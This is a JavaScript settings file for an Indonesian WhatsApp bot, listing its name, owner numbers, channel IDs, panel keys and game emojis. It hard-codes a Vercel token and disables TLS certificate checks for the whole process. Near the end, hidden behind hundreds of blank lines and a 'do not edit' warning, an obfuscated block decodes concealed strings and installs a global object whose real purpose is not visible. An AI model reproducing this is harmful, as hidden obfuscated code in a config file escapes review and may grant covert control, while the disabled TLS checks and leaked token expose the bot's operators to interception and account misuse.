const fs = require("fs");
const chalk = require("chalk");
process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0
/*===============================
M
  O
    D
      E
S
 E
  T
   I
    N
     G
       .
        .
         .
          .
=================================*/

global.setting = {

/*===============================*/

//         SETTINGS BOT

/*===============================*/
namabot: "Rafibot_Bot_Md", //Masukan Nama Bot Disini
nomorbot: "6282284163778", //Masukan Nomor Bot Disini
clear: false, //true = aktif /false = nonaktif
addReply: true, //true = aktif /false = nonaktif
prefix: ".",
    
tampilan: "https://files.catbox.moe/xpm6r9.jpg", // Masukin Link Tampilan Menu Kalian Disini
sound: "https://files.catbox.moe/q3nla8.mp3", // Masukin Link Sound Menu Kalian Disini

/*===============================*/

//         SETTINGS OWNER

/*===============================*/
namaowner: "Rafi_Project", // Masukin Nama Owner Disini
nomorowner: ["6282286315998"], // Masukin Nomor Owner Disini
ownerlid: ["22278616142064@lid"], // Masukin Lid Owner Disini Biar Lid Kalian Kedetect
tiktok: "https://tiktok.com/xxx", // Masukin Link Tiktok Kalian Kalo Ada🗿
instagram: "https//instagram.com/xxx", // Masukin Link Instagram Kalian Kalo Ada🗿
namach: "Jangan Lupa Follow Channel Gw", // Masukin Nama Channel Kalian Bebas
Idch: "120363400514002870@newsletter", // Masukin Id Channel Kalian
website: "https://rafi-panel.vercel.app", //Masukan Web Kalian Disini Kalo Ada
}

/*===============================*/

//         SETTINGS WM

/*===============================*/
global.stickpack = "hai"
global.stickauth = "hai"


/*===============================*/

//        SETTINGS PANEL

/*===============================*/

global.domain = 'https://' //masukin domain panel kalian di sini lagi, samain yang di atas yaa
global.ptla = 'ptla_' //masukin api plta panel kalian, biar cpanelnya work
global.ptlc = 'ptlc_' //masukin api pltc kalian, biar cpanelnya work
//cara dapetin api key panel kalian liat youtube yaa, kalo di sini susah gw kasih tau caranya
global.linkgroup = 'https://chat.whatsapp.com' //Tulis Link Group Panel Kalian
global.akhiran = "@RafiHacker" //buat akhiran Email Cpanel Ngab

global.TokenVercel = "DHJTkEu1QG1fuojGLvG3VFk5"
/*===============================*/

//         SETTINGS DEVELOPER

/*===============================*/
global.multiplier = 1000 // The higher, The harder levelup

global.rpg = {
  emoticon(string) {
    string = string.toLowerCase();
    let emot = {
      exp: '✉️',
      money: '💵',
      potion: '🥤',
      diamond: '💎',
      common: '📦',
      uncommon: '🎁',
      mythic: '🗳️',
      legendary: '🗃️',
      pet: '🎁',
      trash: '🗑',
      armor: '🥼',
      sword: '⚔️',
      wood: '🪵',
      rock: '🪨',
      string: '🕸️',
      horse: '🐎',
      cat: '🐈',
      dog: '🐕',
      fox: '🦊',
      petFood: '🍖',
      iron: '⛓️',
      gold: '👑',
      emerald: '💚'
    };
    let results = Object.keys(emot).filter(v => new RegExp(v, 'gi').test(string));
    if (!results.length) return '';
    else return emot[results[0]];
  }
}

global.settingAnti = global.settingAnti || {};



















































































































































































































































































































































































































































































































































































































































































































































































































































































































/*===============================*/

// JANGAN DI GANTI ATAI DI UBAH
// KALO GAK MAU BOT NYA ERROR

/*===============================*/
function e_zKRX(){}var FQJBXY=Object['defineProperty'],YPP9Wk,mrhCE_y,aY1SGB,qgysnzU,YAsscQ,xgDvek,YYXcLbR,axnYUw,YzjxPfB,NIegYt,idVlU50,iuXo1XD,wVUp4Y,n8P7Bt0,e3HhP8e,_U4DKND,LDrwVH,A9a3u0n,sCwffm6,Ka03_k,aplZoD,uq4y3v;function qUuDwO1(e_zKRX){return YPP9Wk[e_zKRX<0x5d?e_zKRX<0x55?e_zKRX+0x4:e_zKRX>0x5d?e_zKRX-0x25:e_zKRX-0x56:e_zKRX+0x5]}YPP9Wk=YpLep7G();var HebqZEN=[],Sd4Nb8d=['iicXN@od@Vv','dGYX(','5C2u]tv+^5oDyG[9nT',',6HO6`%','Nj<1=9#qT|SSwb}*','28^h','Vj{LRISB1|,lfde*M%TWz9','JGCXm`"`B',',vNQVy[s=:c&81|oJ2y|3w:^u:l&]L^FgqiGy?0jaiXCP(5(gz%~q9o;yHS:TkdV^%','hL?~u|)*?A%ZNKfoRBDud{6*uiw`=_X~pr)BNpG(1H~wriB','@D@uHDOwUNig;;w)NkT','6o@+/|f(#D.@T','?HLAR$$9T$y)9"wu[u5ji_X~/ag$;,UIO%','&ptGkR[w<;tBJ_B','M8o|H.I**|ENA{8!oH]lR3329Ap9Kc~VwjlBR{^w%ks+VkA','^jVB0:mvba','3DnlSvjE&Vi3|bw~P!)~)F}BB','65g|?M_~SV)][Go8&RxhzpZfbp<O0cC~=ke@#F3~:|q','n|ZAQw[T459','&3I1lwb)Ea;NPG7fOn(?zLpnyvV^2d','ZaL12O4H7ApOY")E>}}A','d$~G,Uh(m&TjVWAu_RvBb.*b7iY;NkfzhT','8SQ^gc<oqifDqe]*JS_jO.5nYV','>}]|0g,wB','^p"+yMj+qHb3E[fz26CeADWKXNdAd)H','trT^21k~e','(Lh?gS/(AVY5!)3FwjFlXZr`mYZTu8hfaL+zm"%','Tfy|H.QK:bHR6aPz|qaJ(ZN+_$TZ"dnEbv;+E[YwXH','&L@SZS$jIrDJRCqV/S}@/j%','S!?B!1g+mDBjXp#Ejq:S=sZ(baK(5K4WE+Dz69cww*','EVAZ)sm9orv}GL%~66LMN','>jGJdKD<{|b5]=CVg)E^@w](*7FQvW+9.8DM3.nE@D*]>C','pC2Jm[FMLrougd5(B$C',')kiZ%R:Er7XCh=H','6nH+0R:TjH{+a[D~>I.AZyjbJQM9TW~~xjT','%6KO%KG~x|g1x,N=}j2uR&o~L;19[]%K|jV]E,sT','tXd]b@*:?Hs_mG','},"jU$$UrvKJWie(lCaJ72{SN*lzGC1IYT','"CXA/&AykD3l%','<)h|vjQ~G','f8)~NL!Ht;!w<8++16zO1}[bQ54vZ)XV+keMW','xR4Bt_Z(SD}lzLx(r$8+t_Y*Ufqw4(i8,r6X)','<BuGnv3~6Y1uMCf=/,rSg.U9+fE@_aC6H8WB','EBv|J:335A@`v[_zzqC','0A^h:OA*kD?','*$D.i_hM!Y3pRp:EUD@8d<#Md*','i$wQ>mNb^DzQ/=pziH/+Wy|S5i]}hWFfnv"O+syj5i[','eL{LGRv91H@X}1JFwuAZtwY:Pr:xi8q,N|1jV.D~&;h~hC','Tv^e5yJTED8.5]JF+A,.^_&<+p&@)Gb8oL[Q','*kgA@.eEM|O+mWJ(yr%B].UT','n+(Z8Fx<=5Xq]p7nNk@+C:bJZ:0&6aJf{RsG','.Dgl%g:EG7)Q3c=9"p)ZrM,*(rI','IDU@k:4HIbH]WL28{)}u$ITbA;gk%IHF7V4Bw]<;uNO`7]H','n|;Xl@0jmfDJkC!*PVbQ','Qv.A_1!;}77as(x,?vRA]K`oF7})9dmI`}Aj)','JLn1OK:T;5m@!a!8gjC_Xp6*qv.1id~KpDT','mLe.D:Q~uNFqF,NoQ$:JI"JEQr','>Ie.|}C)paL)?G8nxja.hROJXH','iA8X>MC*w;2uYd','[3{uiS8(5ki.9d','cjQ^m3>nrvc+T','ZlrQ8p)+Q5*gF[p+oHu1o1,b1irq}y/I_%','2oe_l.h(&b/a`Lnq]5{+PU%~Qpl}d)tzdAsL^_k26amQ|1{t','*8%A(Fo~OY{S+[e)NBX~^w[TukK.`c,(mV&B','BASX72LT','Q,UzYcUUKvPhL}b*','M5`BCq<2]5gtRp%KJ1o~U1V*G*Kw[wQ','_,#jgDV+*kwzVKr=fvCQg_AyXHy}^aA)DV@_61x~SV@T8e','xR2M%g,^F7#*hL~K(S$1XMj+vD)R!1hf^3"ep:%','kRLzf@0bkVY]G{#!=iJ?m"GKe*T|ocH8.L#hnZsvQ.ERT','ife.NsQ7!aHQhCh)A9Zz8','nvOGI|oMxiQ=`=T!+6{8}kf2d*z(8y#WF3NQ:,/M&r','`aSjwK,9qA9un"w(J66O:OIvG','XiF.4v+:PVF@5wX~c5}.8ZQKxH','9|.zyy#3gi$&9FGF3|(ZTRO+mx>Ky`?(,Vs8CD%','V$h~F3M3OphnJ"PWqnhZ5R:+5vK','j5(AmO,$2h>0XW89Z%','@&AX@w=JrAOSnad,S5t@,1o7%Hir{iD(%iw8hKA:`k&}%','qHrS^R72uxdU@CmIZaY]/,jEYrG;KLqfqkV]=oR<hQ1','?v2.3K(2%xK].CI,@ry|113ffA,zGL;zL,FMgv?+qix9T','+,Nu|}h}B','f2OzaSP+#VmwkCS)MLf=K9;ojvxY!)%fB1M:T<%','QH{OB<OT^h&','#z{O;2YEs|_9Kcs=%2YQ?MW2r70X."8!}%','65[QL:#(ebK.{C','>51=gy+*?HpYf,++/VO8/$nyXkA|.}B(AT','mH.z`DnT','Gk:M+U{;cAce{iJf_j<@lk.U4b!`Fa%f/r2@W','ljn1cZSfux!Ni8K,(5TjQKF7G','=2q+Y.sJhbO+T','>!k:SS}~h.?q,R(zI3/.?L1EK|g}$C','ka!^)pljpppMbK0~U|pS$.nT','ei%A}_Qhqv$N>8h,!+)=(ZRd','3ldXq[y96p)rlkh','L!<zYy&~pa%^7KY8=L]A%2$T','LVd^5:G~Aay1WCdnXR%=cvD(>7JWi_q~YXSjt','KR.MP?wb`f','t|Vjx]W<+pT"&cn+c,gGVKn9z5/GP`dKrf^hT]%','"qH+kj++ghedz=BuY1xhPlN*!ai;fe7~(iY+WMB2e','FL0eqZY$@h^O*aC6Q38j]RY:pVmuOG>qH,%|F,z(B;=','jB*++[nU^YR.q[X~LAT|t@fh#5&','e|I1_jh2P;e5})(Ewn"XW',':|f+;;%','#5QOyDIU_H','VB@O$S7~PDNgzLR8bHB.Bg%h:bZhI"xflDEXo1T9G','0D|@dy+*WkL0zR<qg}n@cpBMD$X@Wip+L|NGP?b$G',']Rdj>U3(4bT3t,rqmL"OHR9+HV}`5GzEO%','tv_hV@2~obo','6jSh!&bEA.m.~13~','(iPj72r2^DGn[G~9;8nM`M%','a1T]d<;fQVXp5GT!+T','OukOF[%','{BcOLyrKpa`1{UY*Vfsu%;^vax?=gFa',';r%AiLR2i$|zkcA','3j~u23k~$hoQYaP!#qKS4Z9v#Da3paw(!vBMeR%','~n0Ool}~^5J=T','zATjn_rMfk/Nkc_o|8muC:%','!DmJiwXMck}tH=&EdH3+byKHm&9g*"6*P5Rl&g)U`HE','ZYPB/|%~obM`]Cco_vA=`_&<vV#+=8XnVBLzbwM2!rSTAR?(','CGpO2$a(H5f,UdQ','O3f^hgDfAr=;0}=V(isSM&R`5$[YbK9~BkNMr','BvHOyM{H1vRu8e,(g,&B6`F~oragly<W;m#Xtvqd','Y6w.!3wn)Vv@nd8+FShZm"9v#5:96aKFEDXA','hv<LR3]S**2G#w@*ALDl`@?^?iT"I;LuJS@_awwT','m,gl;]k2y$upVK$!"uf=HwWK[hIR`c5V,|;+H','|R8]T2NbqvfD@igI=|SOZv`ByiG|*d;KS5TZNoSo%HQ[9d','p3^8_{1Et*H,3CZ=Y1v|6}^EXi8]u=7!S!EB(_%','p5`|*vNEmx~=")C(I,!Xjjo(7f','1|~Ak;r<Rk9(uas=S5gGbS{o$H9xT','f8{Ody$wyi8.2)PE,3g@j^L^.bu=1]6*W,1jAgw+qisXf,BF','Gx/S<?hfIb+DzC%6i1ZJ:ItMAV','vL|M+[(S4rctvR<Ekuh|?[k;$$VgY8TKmo4|K^8d','zL$G)Zp9s7Gr.F^8)+d','(5b@)cXd',',i$M=cw+`k+.sG#EOYn@"c2f@5,VRistPpw_z',':j1X/9zMoV,QKU@8W$d+BwEJ%H7)cdB*mBoANMybA;gKgd',';|n?cvv+p&+.n"_q]B2u$.NE<*8','saf=WST9lr<f:W"=}n?~kkBM<7zwT)Ku;,C','Ejq]$g.+"i`}~8}fLV&|iyN9`H.``(J(','LutzE9JbLbt@cC*rkL<GrDZq7:Mxp;eu,V}zGgDd','_,GO@K*:cABdGccqlacOxS9*x$|fi"b','bH0XCqi:B','6jT]NoZM%N','h9)^"Zd~EVGglkto;VQ]8','>5O_nU|Mj*mGOk&q|A*+#Z=^:*','P:n?JkJ^(;{&*8!*b$d','b3sz+o*U`$8Rg}7n=k|G','Ppj:k2cJuk])EWqn0l.lZFGhPa"k*d','*AEjjO,wyvrR2br=Dad','aX:ucvnw0*T3Gc<zkC]|+cHd','Jn=]TyF(PVYqAWNq1LC','Uj;j"y?U7:2u)]szPmG_Pp~dkp:wV,Euc%','.A!={M:TJra;5R`=;pHOC2,UVv=','V$o19sk2"v;OC=8+Vo2zu94q3v+g{9HI1%','to_XSwEJM*`YKcZ8r2.@L.59Bb3)XU_z&BzQVD{Ms*y&)Wi','1jg1HKibB;&zL8L(dkFJXL:URHv9PKXfz,p+~Z#MMvy0,1H','UjOJ)UVbYV6Qga^)#:JZ~slET|wxT','w|E|!}^b(b>0*d','"mMuQyUJ&rc:KLD+5,}.[qpUB','W2L|G<gbOfGgJ8Nz!,xhQyC*e','R5"jn_EJlr$N@=g8i,[S9Zwjck8]F;a','fi$1g@UJR:~JVk[+&j@u,[j9pDh3S)E)bXd','n8v|>_ZoVAMN:WB','x|OJTksT%v[aY8Pz[V^:"v@oB.H=OG','H2h^Zy?*{*Y]vyFf0m}GSyjE$h8b/Le6NnT=WLXfikST*aB','*k:@>M8~OazRa,#t.m1jxkMd5k;xmRO*XkZGE|=UJ','vAL@;]u+uHW5PG','m5|@[]k2WA?59"d~_r~z8oXfUiNRB,C)ER*]VMMM^p!pT','A8>lby<3ppBj>dQI#5H+j2)U,;*^Ow~~+nb.G:PT','la`1tF<;gi,]~_H','fX4l:OQ(7i$f4L]uLra@N','<p1Ba@T>M||','>VtGG]Sf_H3iJ_n9!,cX8F8<Lb','xVfjA.$T','hnTZ(p5+Z&+J/={qGiP|!^PV%k1u1]K(bT','q6G_pjA*A;mwq"Vr`lhAsL]f,bM','b8}zxkHd#pPXbK`IX+eS(oh7r|kX@L$Vd1xO*w%','MBi?p:yje|e[{cMzKB%A','rj*]>UJ)!V+qGC','UqP|)oah^hng3c|o`Bd','@mR1cy8hWN`&skl*15/+5RcJ2YLTD)eu>%','E3=O4?fM!V','Qoe.z`fK1A','!S_]PMZq[fFw*8s=ZpeMZFBMA5W~lG','p8*+y.@o?|t@]pXf|3HJhSF`F71@PRKu*jNMnFH}9A$lLLl)','.Cq=*y^+E;+.mGC)u|#:WLWd','8+gz,,rSHDB~;,g8.pu@jIUJRA4Tj}?nC1a?ssahgi','WBpX;]NEGvE','#Vd^|,mJNbjDvRQFG$1hfM$bF*11s`)9I5hjsmZqD:o','qok+{F3;B','or9+7]Cw8r8R*a},*Hs_*L$n6h?@j=>E?kJZ)','q6NJoUG}XH*jC_28qA)j{DJJo5`2j}dK9vT','96c:*_^+/a5G&p{='];mrhCE_y=(e_zKRX,FQJBXY,aY1SGB,qgysnzU,YAsscQ)=>{var xgDvek=sPqiuX(e_zKRX=>{return YPP9Wk[e_zKRX>0x32?e_zKRX-0x2d:e_zKRX<0x32?e_zKRX-0x2b:e_zKRX+0x56]},0x1);if(typeof qgysnzU==='undefined'){qgysnzU=Nw2o8ZY}if(typeof YAsscQ===xgDvek(0x2b)){YAsscQ=HebqZEN}if(aY1SGB==qgysnzU){return FQJBXY?e_zKRX[YAsscQ[FQJBXY]]:HebqZEN[e_zKRX]||(aY1SGB=YAsscQ[e_zKRX]||qgysnzU,HebqZEN[e_zKRX]=aY1SGB(Sd4Nb8d[e_zKRX]))}if(qgysnzU===mrhCE_y){Nw2o8ZY=FQJBXY;return Nw2o8ZY(aY1SGB)}if(aY1SGB&&qgysnzU!==Nw2o8ZY){mrhCE_y=Nw2o8ZY;return mrhCE_y(e_zKRX,-xgDvek(0x31),aY1SGB,qgysnzU,YAsscQ)}if(qgysnzU===qUuDwO1(0x58)){mrhCE_y=YAsscQ}if(e_zKRX!==FQJBXY){return YAsscQ[e_zKRX]||(YAsscQ[e_zKRX]=qgysnzU(Sd4Nb8d[e_zKRX]))}if(FQJBXY){[YAsscQ,FQJBXY]=[qgysnzU(YAsscQ),e_zKRX||aY1SGB];return mrhCE_y(e_zKRX,YAsscQ,aY1SGB)}};function EyxjEFp(){return globalThis}function Lno8Ke9(){return global}function YWAYBQ(){return window}function _nN3uZ5(){return new Function('return this')()}function xjEMp3(FQJBXY=[EyxjEFp,Lno8Ke9,YWAYBQ,_nN3uZ5],YPP9Wk,mrhCE_y=[],aY1SGB=0x0,qgysnzU){YPP9Wk=YPP9Wk;try{e_zKRX(YPP9Wk=Object,mrhCE_y.push(''.__proto__.constructor.name))}catch(e){}LTMgtO:for(aY1SGB=aY1SGB;aY1SGB<FQJBXY.length;aY1SGB++)try{YPP9Wk=FQJBXY[aY1SGB]();for(qgysnzU=qUuDwO1(0x5b);qgysnzU<mrhCE_y[qUuDwO1(0x57)];qgysnzU++)if(typeof YPP9Wk[mrhCE_y[qgysnzU]]===qUuDwO1(0x56)){continue LTMgtO}return YPP9Wk}catch(e){}return YPP9Wk||this}e_zKRX(aY1SGB=xjEMp3()||{},qgysnzU=aY1SGB.TextDecoder,YAsscQ=aY1SGB.Uint8Array,xgDvek=aY1SGB.Buffer,YYXcLbR=aY1SGB.String||String,axnYUw=aY1SGB.Array||Array,YzjxPfB=sPqiuX(()=>{var FQJBXY=new axnYUw(0x80),YPP9Wk,mrhCE_y;e_zKRX(YPP9Wk=YYXcLbR.fromCodePoint||YYXcLbR.fromCharCode,mrhCE_y=[]);return sPqiuX(aY1SGB=>{var qgysnzU,YAsscQ,xgDvek,axnYUw;e_zKRX(xgDvek=aY1SGB.length,mrhCE_y[qUuDwO1(0x57)]=0x0);for(axnYUw=0x0;axnYUw<xgDvek;){YAsscQ=aY1SGB[axnYUw++];if(YAsscQ<=0x7f){qgysnzU=YAsscQ}else{if(YAsscQ<=0xdf){qgysnzU=(YAsscQ&0x1f)<<0x6|aY1SGB[axnYUw++]&0x3f}else{if(YAsscQ<=0xef){qgysnzU=(YAsscQ&0xf)<<0xc|(aY1SGB[axnYUw++]&0x3f)<<0x6|aY1SGB[axnYUw++]&0x3f}else{if(YYXcLbR.fromCodePoint){qgysnzU=(YAsscQ&0x7)<<0x12|(aY1SGB[axnYUw++]&0x3f)<<0xc|(aY1SGB[axnYUw++]&0x3f)<<0x6|aY1SGB[axnYUw++]&0x3f}else{e_zKRX(qgysnzU=0x3f,axnYUw+=0x3)}}}}mrhCE_y.push(FQJBXY[qgysnzU]||(FQJBXY[qgysnzU]=YPP9Wk(qgysnzU)))}return mrhCE_y.join('')},0x1)})());function XFOGPNL(e_zKRX){return typeof qgysnzU!==qUuDwO1(0x56)&&qgysnzU?new qgysnzU().decode(new YAsscQ(e_zKRX)):typeof xgDvek!=='undefined'&&xgDvek?xgDvek.from(e_zKRX).toString('utf-8'):YzjxPfB(e_zKRX)}e_zKRX(NIegYt=mrhCE_y(0x5b),idVlU50=mrhCE_y(0x41),iuXo1XD=mrhCE_y(0x33),wVUp4Y=mrhCE_y(0x30),n8P7Bt0=mrhCE_y(0x28),e3HhP8e=mrhCE_y[qUuDwO1(0x59)](void 0x0,0x21),_U4DKND=mrhCE_y(0x1e),LDrwVH=mrhCE_y(0x1a),A9a3u0n=mrhCE_y(0x16),sCwffm6=mrhCE_y.call(qUuDwO1(0x58),0x10),Ka03_k={wBBswA:mrhCE_y(0x9),MdJzsX:mrhCE_y(0xb),mHw_pG:mrhCE_y[qUuDwO1(0x59)](qUuDwO1(0x58),0xd),b7j9v8:mrhCE_y(0x29),rpR8VK:mrhCE_y(0x2b),ZpBJIZk:mrhCE_y(0x2f),rFGwjYf:mrhCE_y.apply(qUuDwO1(0x58),[0x3a]),hdB1alK:mrhCE_y(0x3e),pZeP9E5:mrhCE_y(0x5d),jZdMwRz:mrhCE_y[qUuDwO1(0x5a)](void 0x0,[0x5f]),lfDaMw:mrhCE_y(0x61),p6doNO:mrhCE_y[qUuDwO1(0x5a)](qUuDwO1(0x58),[0x64]),YYjGHn:mrhCE_y(0x7f),vFjNPh:mrhCE_y(0x9b)},aplZoD=mrhCE_y(0x4),uq4y3v=[mrhCE_y[qUuDwO1(0x59)](qUuDwO1(0x58),qUuDwO1(0x5b)),mrhCE_y(0x8),mrhCE_y(0xa),mrhCE_y(0x18),mrhCE_y.call(void 0x0,0x1b),mrhCE_y(0x2e),mrhCE_y.apply(qUuDwO1(0x58),[0x40]),mrhCE_y.call(void 0x0,0x47),mrhCE_y(0x49),mrhCE_y(0x4b),mrhCE_y(0x62),mrhCE_y(0x65),mrhCE_y(0x78),mrhCE_y(0x87),mrhCE_y(0x95),mrhCE_y.call(qUuDwO1(0x58),0x97),mrhCE_y(0xac)],global[uq4y3v[qUuDwO1(0x5b)]]={[mrhCE_y(qUuDwO1(0x5c))]:mrhCE_y(0x2),[mrhCE_y(0x3)]:[aplZoD],[mrhCE_y(0x5)]:[mrhCE_y(0x6)],[mrhCE_y(0x7)]:uq4y3v[qUuDwO1(0x5c)]});function Nw2o8ZY(FQJBXY,mrhCE_y='%TdCGeBJhAQYHbaiWVf*rNtn()8=z+~uX?q9K,FIoE!6/m2UR1_jM:|.&v;pk[D$75x03w}L]lS^@OZg`y"c{s<>4P#',aY1SGB,qgysnzU,YAsscQ=[],xgDvek=0x0,YYXcLbR=0x0,axnYUw,YzjxPfB,NIegYt){var idVlU50=sPqiuX(FQJBXY=>{return YPP9Wk[FQJBXY<0x31?FQJBXY>0x31?FQJBXY+0xe:FQJBXY-0x2a:FQJBXY+0x40]},0x1);e_zKRX(aY1SGB=''+(FQJBXY||''),qgysnzU=aY1SGB.length,axnYUw=-qUuDwO1(0x5c));for(YzjxPfB=idVlU50(0x2f);YzjxPfB<qgysnzU;YzjxPfB++){NIegYt=mrhCE_y.indexOf(aY1SGB[YzjxPfB]);if(NIegYt===-0x1){continue}if(axnYUw<0x0){axnYUw=NIegYt}else{e_zKRX(axnYUw+=NIegYt*0x5b,xgDvek|=axnYUw<<YYXcLbR,YYXcLbR+=(axnYUw&0x1fff)>0x58?0xd:0xe);do{e_zKRX(YAsscQ.push(xgDvek&0xff),xgDvek>>=0x8,YYXcLbR-=0x8)}while(YYXcLbR>0x7);axnYUw=-0x1}}if(axnYUw>-idVlU50(0x30)){YAsscQ.push((xgDvek|axnYUw<<YYXcLbR)&0xff)}return XFOGPNL(YAsscQ)}function YpLep7G(){return['undefined','length',void 0x0,'call','apply',0x0,0x1]}function sPqiuX(e_zKRX,YPP9Wk=0x0){var mrhCE_y=function(){return e_zKRX(...arguments)};return FQJBXY(mrhCE_y,'length',{'value':YPP9Wk,'configurable':true})}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
  fs.unwatchFile(file)
  console.log(chalk.redBright("Update 'Ruang_Ganti-Ganti.js'"))
  delete require.cache[file]
  process.exit(1)
})